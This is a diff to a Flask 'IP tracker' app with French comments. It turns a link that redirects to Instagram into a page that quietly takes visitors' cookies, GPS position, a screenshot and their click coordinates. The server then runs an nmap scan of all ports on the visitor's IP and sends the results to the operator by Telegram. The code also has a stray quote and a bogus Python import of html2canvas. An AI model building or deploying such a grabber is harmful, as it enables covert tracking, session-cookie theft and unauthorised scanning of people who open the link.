@@ -1,7 +1,9 @@
-from flask import Flask, request, jsonify
+"from flask import Flask, request, jsonify
 from twilio.rest import Client
 import requests
 import socket
+import nmap
+import html2canvas
 
 app = Flask(__name__)
 
@@ -13,6 +15,7 @@ to_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
 
+# Fonction pour récupérer la géolocalisation
 def get_geolocation(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}").json()
@@ -20,39 +23,41 @@ def get_geolocation(ip):
     except:
         return "Localisation impossible"
 
-def scan_ports(ip, ports=[22, 80, 443, 8080]):
-    open_ports = []
-    for port in ports:
-        try:
-            sock = socket.socket()
-            sock.settimeout(0.5)
-            result = sock.connect_ex((ip, port))
-            if result == 0:
-                open_ports.append(port)
-            sock.close()
-        except:
-            continue
+# Fonction pour scanner les ports
+def scan_ports(ip):
+    nm = nmap.PortScanner()
+    nm.scan(ip, '1-65535')  # Scanne tous les ports possibles
+    open_ports = nm[ip].all_tcp()  # Liste tous les ports TCP ouverts
     return open_ports
 
-def send_sms(ip, user_agent):
+# Fonction pour envoyer les messages via Telegram
+def send_telegram(message):
+    token = "YOUR_BOT_TOKEN"  # Remplace avec ton token
+    chat_id = "YOUR_CHAT_ID"  # Remplace avec ton chat_id
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {'chat_id': chat_id, 'text': message}
+    requests.post(url, data=payload)
+
+# Fonction d'envoi d'alertes par SMS ou Telegram
+def send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y):
     location = get_geolocation(ip)
     ports = scan_ports(ip)
-    message_body = (
-        f"[IP TRACKER]\n"
-        f"IP publique : {ip}\n"
-        f"Localisation : {location}\n"
-        f"Ports ouverts : {ports if ports else 'Aucun trouvé'}\n"
-        f"User-Agent : {user_agent}"
-    )
-    try:
-        message = client.messages.create(
-            body=message_body,
-            from_=from_number,
-            to=to_number
-        )
-        print(f"[+] SMS envoyé : {message.sid}")
-    except Exception as e:
-        print(f"[!] Erreur envoi SMS : {e}")
+
+    # Préparation du message
+    message_body = f"""
+    Nouvelle visite !
+    IP : {ip}
+    User-Agent : {user_agent}
+    Cookies : {cookies}
+    Capture d'écran : {screenshot[:100]}...
+    Géolocalisation GPS : {latitude}, {longitude}
+    Cliquez à : ({click_x}, {click_y})
+    Ports ouverts : {ports if ports else 'Aucun trouvé'}
+    Localisation : {location}
+    """
+    
+    # Envoie de l'alerte par Telegram
+    send_telegram(message_body)
 
 @app.route('/')
 def index():
@@ -60,21 +65,37 @@ def index():
     <html>
     <head><title>Redirection</title></head>
     <body>
+        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
         <script>
+            const cookies = document.cookie; // Récupère les cookies de l'utilisateur
+
             fetch("https://api.ipify.org?format=json")
             .then(res => res.json())
             .then(data => {
-                fetch("/log", {
-                    method: "POST",
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        ip: data.ip,
-                        ua: navigator.userAgent
-                    })
-                }).then(() => {
-                    window.location.href = "https://www.instagram.com";
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    html2canvas(document.body).then(canvas => {
+                        const screenshot = canvas.toDataURL(); // Capture l'écran en base64
+
+                        document.body.addEventListener('click', function(event) {
+                            fetch("/log", {
+                                method: "POST",
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    ip: data.ip,
+                                    ua: navigator.userAgent,
+                                    cookies: cookies, // Envoie les cookies
+                                    screenshot: screenshot, // Envoie la capture
+                                    latitude: latitude, // Envoie la latitude
+                                    longitude: longitude, // Envoie la longitude
+                                    click_x: event.pageX, // Envoie les coordonnées du clic
+                                    click_y: event.pageY  // Envoie les coordonnées du clic
+                                })
+                            });
+                        });
+                    });
                 });
             });
         </script>
@@ -87,9 +108,17 @@ def log():
     data = request.get_json()
     ip = data.get('ip')
     user_agent = data.get('ua')
-    print(f"[+] IP reçue : {ip}")
-    send_sms(ip, user_agent)
+    cookies = data.get('cookies')
+    screenshot = data.get('screenshot')
+    latitude = data.get('latitude')
+    longitude = data.get('longitude')
+    click_x = data.get('click_x')
+    click_y = data.get('click_y')
+
+    # Envoie de l'alerte par SMS/Telegram
+    send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y)
+
     return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=True, host='0.0.0.0', port=5000)" 
